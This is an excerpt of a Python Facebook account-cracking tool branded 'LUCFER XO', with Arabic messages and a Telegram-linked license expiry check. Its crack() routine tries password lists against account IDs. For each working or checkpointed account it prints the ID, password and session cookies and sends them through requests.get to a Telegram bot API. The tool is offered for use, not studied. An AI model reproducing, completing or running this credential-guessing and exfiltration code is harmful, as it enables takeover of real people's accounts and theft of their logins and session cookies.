...
g= datetime.datetime(2023, 9, 28, 1, 00 ,0)
'''
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+' انتهئ التفعيل انضم للقناه للحصول ع احدث نسخه https://t.me/LUCFER_XO_AND🖤' )
 print('\n\n')
 print(x)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("   "+' انتهت الصلاحيه الاداة عليك بمراسلة لوسفر  لتفعيل الاداة  🖤 \n يوزر لوسفر  : @krro6' )
    print('\n\n')
    print(x)
...
# +================================================+
# | _    _   _  ____ _____ _____ ____   __  _____  |
# || |  | | | |/ ___|  ___| ____|  _ \  \ \/ / _ \ |
# || |  | | | | |   | |_  |  _| | |_) |  \  / | | ||
# || |__| |_| | |___|  _| | |___|  _ <   /  \ |_| ||
# ||_____\___/ \____|_|   |_____|_| \_\ /_/\_\___/ |
# +================================================+

   {B}« {C}CODE BY LUCFER XO  🍏📱🧑‍💻 {B}»
{P}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━{P}┓    
{B}┃{C} ⌯ Telegram {B}› {C}@krro6 {B} 	┃
{P}┗{B}━━━━━━━━━━━━━━━━━━━━━━━━━━{P}┛              
""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
...
def menu(sy2,sy3):
	...
	banner()
	print('\033[0;92m=============================')
	print("\033[97;1m[\033[92;1m1\033[97;1m] \x1b[33m\x1b[33m \x1b[33m[\033[0;92m\x1b[36mCRACK ID\x1b[33m]")
	print("\033[97;1m[\033[92;1m2\033[97;1m] \x1b[33m\x1b[33m \x1b[33m[\033[0;92mcrack file\x1b[36m\x1b[33m]")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[\033[1;31m LUCFER XO \033[1;32m\033[1;33m\033[1;34m\033[1;35m\033[1;32m]  {P}{b}{loop}{P}•{b}{len(id)}{P}   OK:{P}{H}{ok}{P}   CP:{P}{M}{cp}{P}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{asu}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cpp = f'''\r
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
🇫​​​​​🇦​​​​​🇨​​​​​🇪​​​​​🇧​​​​​🇴​​​​​🇴​​​​​🇰​​​​​ 👨🏻‍💻  سكيور ❌يمكن شغال ويمكن لا افحصه 
          ┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
...
━━━━━━━━━━━LUCFER XO━━━━━━━━━━━
𓅓 -  🇨​​​​​🇴​​​​​🇴​​​​​🇰​​​​​🇮​​​​​🇪​​​​​🇸​​​​​ : {kuki} '''
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(cpp))
				print ('\x1b[36m|CP.|')
				print(f'\r\033[0;93m[\33[1;96m[CP]\33[1;93m]  {idf}  {pw} ')
				print ('\x1b[36m|﹍﹍﹍﹍﹍LUCFER XO﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
...
━━━━━━━━━━━LUCFER XO━━━━━━━━━━━
𓅓 -  🇨​​​​​🇴​​​​​🇴​​​​​🇰​​​​​🇮​​​​​🇪​​​​​🇸​​​​​ : {kuki}'''
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(okk))
				print ('\x1b[32m|لوسفر جابلك حساب شغال 👍🏻✅|')
				print(f'\r\33[1;93m[\33[1;92m[OK]\33[1;93m] \33[1;92m{idf} {pw} | \n\033[0;92m{kuki} ')
				print ('\x1b[32m|﹍﹍﹍﹍﹍LUCFER XO﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
